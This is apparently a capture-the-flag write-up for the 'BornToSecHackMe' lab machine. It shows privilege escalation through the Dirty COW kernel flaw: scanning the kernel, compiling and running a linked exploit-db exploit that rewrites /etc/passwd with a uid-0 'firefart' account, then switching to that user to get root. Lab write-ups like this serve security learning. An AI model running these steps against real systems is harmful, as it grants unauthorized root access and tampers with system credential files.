# Write Up 2

For the next `exploit` we want to find `vulnerabilties` about the `kernel` verion, `CVE`

We will use a `DirtyScript` but for first lets check if our machien is exploitable:

We use this script:

>https://github.com/aishee/scan-dirtycow/blob/master/dirtycowscan.sh

And here the output:

```
firefart@BornToSecHackMe:/var/crash# ./DirtyScan.sh 
Your kernel is 3.2.0-91-generic-pae which IS vulnerable.
It is recommends that you update your kernel. Alternatively, you can apply partial
mitigation described at https://access.redhat.com/security/vulnerabilities/2706661 .
The kernel available to update to is 3.2.0-91-generic IS also vulnerable.
```

So know we have to use this script:

>https://www.exploit-db.com/exploits/40839

```
zaz@BornToSecHackMe:/var/crash$ gcc dirty.c -pthread -lcrypt -o dirty
zaz@BornToSecHackMe:/var/crash$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash
```

In the `/etc/passwd` file we can see a `new user`:

```
zaz@BornToSecHackMe:/var/crash$ cat /etc/passwd
firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash
```

So try to connect with:

>login: `firefart` password: `123` (this is the password entered with the previous script)

```
zaz@BornToSecHackMe:/var/crash$ su firefart
Password: 
firefart@BornToSecHackMe:/var/crash# id
uid=0(firefart) gid=0(root) groups=0(root)
```

And GOOD JOB! We are root.
